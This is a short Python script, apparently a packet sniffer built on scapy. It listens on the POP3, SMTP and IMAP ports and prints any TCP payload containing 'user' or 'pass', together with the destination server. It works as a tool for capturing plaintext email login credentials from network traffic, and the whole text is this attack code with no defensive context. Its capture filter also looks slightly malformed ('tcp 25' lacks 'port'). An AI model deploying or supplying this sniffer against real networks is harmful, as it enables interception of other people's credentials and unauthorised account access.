from scapy.all import *
from scapy.layers.inet import TCP, IP


def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)

        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)


sniff(filter = "tcp port 110 or tcp 25 or tcp 143",
      prn = packet_callback, store = 0)